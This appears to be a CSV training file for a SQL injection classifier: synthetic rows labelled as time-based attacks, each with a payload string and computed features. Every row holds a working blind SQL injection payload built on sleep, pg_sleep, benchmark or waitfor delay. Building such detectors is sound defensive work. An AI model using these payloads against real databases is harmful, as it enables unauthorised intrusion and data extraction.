id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000121,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,1.5171368709308353,72.18452260458078,22.96130651145196,3.439347448286127,15.592261302290392,18.0,30.0,8.592261302290392,0.2159526747817685,0.24940740750869106,0.41567901251448514,0.11896090519505528,0.5922613022903916,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.5922613022903916,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5922613022903918,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000122,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000141,0.030873675690932766,84.9571954917399,25.012229859502888,3.631924331010489,30.944965632237,10.0,33.0,11.012229859502888,0.3642004552784628,0.11771162067610876,0.3884483482311589,0.1296395758142695,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.012229859502888463,0.9999999999999999,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9938850702485555,0.006114929751444287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000123,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,1.60460225893879,69.89255423496763,18.514043387974105,3.0371947854147647,20.135532540980577,5.028086775948211,33.72893491803884,11.0,0.287723143094741,0.07012989369350182,0.48457607211277326,0.1575708910989839,4.0,0.0,0.0,0.0,0.0,1.3785108469935263,0.0,5.242978306012947,0.0,0.0,0.37851084699352644,1.3785108469935263,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.8263728215578041,59.65561980637119,23.526965769608232,3.557191267891911,19.0,10.0,23.419102691175304,7.236517115195884,0.3192422343975988,0.16802222863031516,0.391481252081698,0.12125428489038806,0.7634828848041157,0.23651711519588414,2.0,0.0,0.0,1.0,0.0,3.236517115195884,0.0,0.0,0.0,3.0,0.763482884804116,0.23651711519588417,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,0.03640088886637052,71.96451243114456,23.023658379236963,3.497201844333503,17.0,19.0,27.952683241526074,8.011829189618481,0.23623254602869215,0.2640246102673618,0.3884031492185648,0.11133969448538127,0.011829189618481006,0.0,0.0,0.0,0.0,1.0,0.0,4.9881708103815185,0.011829189618481117,0.0,1.0,1.0,0.011829189618481006,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000028,0.7783472029930396,63.330243237524456,19.776747745841487,3.168860647238094,23.553495491682973,1.0,29.0,9.776747745841487,0.37179761110838194,0.015796556547765253,0.45810013988519227,0.1543056924586605,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.776747745841486,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22325225415851385,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.223252254158514
SMOTE_000127,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,0.3187514677609617,68.29039299963108,17.435589499446614,2.82370964320625,19.290392999631077,2.0,36.0,11.0,0.28240110440796695,0.029289750840491152,0.5272155151288406,0.1610936296227013,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8548035001844618,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.854803500184462
SMOTE_000128,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000006,0.03554662933145145,93.82147100285152,28.0,3.5707260078053045,30.0,10.0,40.85717680228122,12.964294200570304,0.3198272378311113,0.10660907927703708,0.4353969488725332,0.1381667340193185,0.0,4.0,0.0,0.0,0.0,2.0,0.0,5.964294200570304,0.0,0.9999999999999999,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000129,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000135,1.170070475607678,70.57945861793547,19.34918934219355,2.845542551631217,19.3016213156129,2.0,37.952431973419344,11.325405328903225,0.2730153794533536,0.028480880743231726,0.5376870325245732,0.16081670727884154,0.0,4.0,0.0,0.0,0.0,0.6745946710967754,0.0,6.650810657806449,0.0,0.0,0.0,0.6745946710967754,0.0,1.0,0.0,0.0,0.0,0.6745946710967756,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000104,1.138180229979944,86.84933724313352,26.53766568921662,3.6400837719820456,24.0,18.0,34.84933724313352,10.0,0.27648590960539265,0.2073644322040445,0.40094719585498256,0.11520246233558028,0.0,0.5376656892166197,2.0,0.0,0.0,2.0,0.0,4.46233431078338,0.0,0.9999999999999999,0.0,4.0,0.0,0.5376656892166197,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000021,1.049249852674328,72.61781058794472,22.14656823616585,3.4639310373674537,21.617810587944717,10.0,30.0,11.0,0.2976614041067695,0.13771345017514322,0.4131403505254297,0.15148479519265756,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6178105879447156,0.3821894120552844,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000072,0.8268505567476435,82.19710616214554,24.19710616214554,3.200100315398291,29.19710616214554,2.0,39.0,12.0,0.3551162615787169,0.0243352354121239,0.47453709053641585,0.14601141247274335,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.40144691892722967,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.401446918927229
SMOTE_000133,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000058,0.2675869518357962,67.42738260169467,25.89315434957633,3.7017613892720744,15.0,21.0,24.427382601694678,7.0,0.2225329537470212,0.31154613524582975,0.3620721992585392,0.10384871174860989,0.0,0.8931543495763312,0.0,0.0,0.0,1.0,0.0,4.106845650423669,0.0,0.0,1.0,1.0,0.0,0.893154349576331,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000019,1.5207496924374442,94.77357296964753,22.46226216160792,3.257642690042671,37.84904864643168,1.0,42.92452432321585,13.0,0.3990975874627778,0.01056193733699562,0.45303528981928365,0.137305185380943,3.0,0.0,0.0,0.0,1.0,0.5377378383920778,0.0,8.462262161607923,0.0,0.0,0.0,1.537737838392078,1.0,0.0,0.0,0.0,0.0,0.5377378383920779,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000135,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000065,0.2697358333127164,84.5784321462635,27.832756723089823,3.6848782607132504,31.2474052539042,10.0,33.49827016926947,9.832756723089823,0.3688518744784849,0.11867470147242418,0.39622253818406056,0.1162508858650303,0.9163783615449113,0.0,2.0,0.0,0.0,1.0,0.0,4.916378361544911,0.0,0.9999999999999999,0.0,3.0,0.9163783615449113,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,0.31911974061560483,61.37764242216206,17.125880807387354,2.5464655253278474,10.37764242216206,2.0,36.0,13.0,0.16886776729771133,0.03259342089028584,0.5866815760251449,0.2118572357868579,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.8741191926126466,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8741191926126466
SMOTE_000137,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,1.1501695588860368,79.1810741752208,27.0,3.7034327878562907,23.0,15.0,30.15089514601734,11.030179029203467,0.2921571787219857,0.19053729047086027,0.3781609172085005,0.13914461359865352,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.030179029203468,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000194,0.45490641638036333,91.11707122457135,28.0,3.622929729880475,25.79790801755096,18.0,37.31916320702038,10.0,0.28280468968674716,0.19769676036170858,0.4096670164172617,0.10983153353428254,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8404183964898082,0.15958160351019177,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000139,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000288,0.18765105637709023,70.46001661514767,20.712489615532707,2.9872714913504863,20.884995846213084,2.0,36.460016615147666,11.115004153786916,0.29675629309831775,0.028402924316795725,0.5171502866144726,0.15769049597041387,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.115004153786916,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0575020768934582,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.057502076893458
SMOTE_000140,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.12685788259847242,91.39756054895834,21.11358872827381,2.825751427622745,28.11358872827381,2.0,49.22717745654763,12.056794364136906,0.3076031485649342,0.02188886285064849,0.5385952771525987,0.13191271143181862,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.056794364136906,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9432056358630934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.943205635863094
SMOTE_000141,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000230,1.0523206166447714,91.4966543122158,22.2483271561079,2.963399499295236,28.0,1.2483271561078997,47.4966543122158,14.751672843892099,0.3060491172465979,0.013600510090228418,0.5190656728982034,0.16128469976497034,0.0,2.5033456877841993,0.0,0.0,1.0,0.7516728438920997,0.0,9.248327156107901,1.0,0.0,0.0,1.7516728438920997,0.0,1.0,0.0,0.2483271561079004,0.0,0.7516728438920997,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000142,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.6397555611768847,58.40256986786946,19.0,3.3247512045692322,25.28051397357389,1.7194860264261091,23.402569867869452,8.0,0.4331989388220078,0.02976954266286061,0.3998556721492447,0.13717584636588692,0.0,3.719486026426109,0.0,0.0,0.0,0.0,0.0,4.280513973573891,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.28051397357389046,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2805139735738904
SMOTE_000143,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,0.5428071990435441,88.79267212174386,27.207327878256134,3.855699927696863,26.0,21.792672121743866,30.0,11.0,0.2928231007194407,0.24541739429990284,0.33787280852243157,0.12388669645822491,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.7926721217438653,0.20732787825613477,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000140,0.0002658453756042331,86.0004070138789,29.999918597224223,3.795561285838448,25.0,18.0,33.000325611103115,10.000081402775779,0.29069637422093375,0.2093013894390723,0.3837227921156229,0.11627944422437107,8.140277577894928e-05,0.9999185972242208,2.0,0.0,0.0,2.0,0.0,4.000081402775779,0.0,0.9999999999999999,0.0,4.0,8.140277577883825e-05,0.999918597224221,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000237,0.20662736975711096,71.07786199975715,20.311447999028587,3.3052651370949433,15.0,18.0,30.0,8.077861999757147,0.21103913732465623,0.2532469647895875,0.4220782746493125,0.11363562323644372,0.0,0.0778619997571468,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.07786199975714672,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.18436563867175781,58.36164115214166,23.939726474643056,3.6075921001287026,18.939726474643056,10.0,22.361641152141658,7.060273525356943,0.3247933603552279,0.17143954430996322,0.3828176404841324,0.12094945485067649,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.060273525356943,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.939726474643057,0.06027352535694297,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.2534768408594993,95.72162770936515,22.0,3.18645008197441,36.0,1.0,44.97730216749211,13.744325541873028,0.37629105809758573,0.010452529391599602,0.46970007122545254,0.14355634128536213,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.744325541873028,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000037,0.4108318409457589,87.92139423783404,27.0,3.518712772274452,23.0,15.0,37.33711539026723,12.584278847566807,0.2618049585006297,0.17074236423954112,0.4243667986730096,0.14308587858681962,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.584278847566807,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000102,1.2205955163918565,71.53146611234011,25.0,3.5652520069684925,15.0,21.53146611234012,28.0,7.0,0.209708139341725,0.3009728688609167,0.39145519343788665,0.09786379835947168,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.5314661123401181,0.468533887659882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000007,0.334241203473481,77.69908254754658,22.0,3.127106021215032,19.0,10.0,38.35926603803727,10.339816509509317,0.24475591806312783,0.12881890424375148,0.49341100789987147,0.13301416979324923,0.0,0.0,2.0,0.0,0.0,1.0,0.0,6.339816509509317,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,0.1593803578167309,75.12691700072384,24.03172925018096,3.222562543584883,15.253834001447686,11.746165998552316,37.0,11.126917000723843,0.20289177976332806,0.15652986428400634,0.49254077147227304,0.14803758448039256,2.0,0.12691700072384193,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.031729250180960566,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,0.09893595009556092,72.37501429637548,23.028847253567346,3.4890079909249683,17.0,19.0,28.288472535673446,8.086541760702033,0.23506940473229032,0.26272462881844216,0.3905669317434599,0.1116390347058076,0.0,0.028847253567344522,0.0,0.0,0.0,1.0,0.0,5.057694507134689,0.0,0.0,1.0,1.0,0.0,0.028847253567344522,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
